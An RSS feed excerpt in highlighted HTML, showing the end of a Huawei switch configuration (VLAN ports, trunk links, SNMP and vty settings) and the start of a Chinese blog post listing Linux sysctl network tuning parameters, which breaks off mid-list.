<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/25</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 125</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/26</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 126</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/27</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 127</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/28</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 128</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/29</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 129</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/30</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 130</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/31</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/32</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/33</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/34</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/35</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/36</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/37</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/38</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/39</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/40</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/41</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/42</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/43</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/44</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/45</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/46</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/47</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/48</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 10GE1/0/1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> trunk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> trunk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> allow-pass</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4094</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inbound</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> outbound</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sampler</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> random-packets</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inbound</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sampler</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> random-packets</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> outbound</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 10GE1/0/2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> trunk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> trunk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> allow-pass</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4094</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 10GE1/0/3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> trunk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> trunk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> allow-pass</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4094</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 10GE1/0/4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> trunk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> trunk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> allow-pass</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4094</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> NULL0</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">snmp-agent</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">snmp-agent</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> local-engineid</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 800007DB0304F938EBDC11</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">snmp-agent</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> community</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> read</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cipher</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> %@%@5Oo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">+77#A0K</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'$Q,6"&amp;#$,r2;#cJH0/"_.&amp;&lt;:NYGur(PNr2&gt;,nK"H/9P{#S6@._S-zbwC2G,r%@%@</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">snmp-agent sys-info version v2c v3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lldp enable</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">user-interface con 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">user-interface vty 0 4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> authentication-mode aaa</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> user privilege level 15</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> protocol inbound all</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vm-manager</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">return</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">[~HUAWEI]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>网络服务器内核优化生产案例</title>
      <link>https://www.geekery.cn/note-book/LinuxOperaSystem/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E6%A0%B8%E4%BC%98%E5%8C%96%E7%94%9F%E4%BA%A7%E6%A1%88%E4%BE%8B.html</link>
      <guid>https://www.geekery.cn/note-book/LinuxOperaSystem/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E6%A0%B8%E4%BC%98%E5%8C%96%E7%94%9F%E4%BA%A7%E6%A1%88%E4%BE%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">网络服务器内核优化生产案例</source>
      <description>网络服务器内核优化生产案例 内核参数 /etc/sysctl.conf.d/99-sysctl.conf</description>
      <pubDate>Mon, 01 Apr 2024 09:18:31 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>内核参数</h2>
<p>/etc/sysctl.conf.d/99-sysctl.conf</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.perf_event_max_sample_rate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=100000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.core.default_qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=fq</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_congestion_control</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=bbr</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.core.optmem_max</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 81920</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.core.rmem_default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 327680</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.core.rmem_max</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 327680</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.core.wmem_default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 327680</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.core.wmem_max</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3276800</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.core.netdev_budget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 600</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.core.netdev_max_backlog</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 262144</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.core.somaxconn</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65535</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.ip_local_reserved_ports</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"3344,4444,5554,7063,9995,9996,1026,11211,53831,30754,42793,49393"</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_mem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 7864320</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">   7864320</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 7864320</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_rmem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4096</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    87380</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  2097152</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_wmem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4096</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    262144</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2097152</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.udp_mem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4096</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 262144</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2097152</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.udp_rmem_min</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4096</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.udp_wmem_min</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4096</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.ip_forward</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.conf.all.forwarding</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.conf.default.forwarding</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.conf.default.rp_filter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
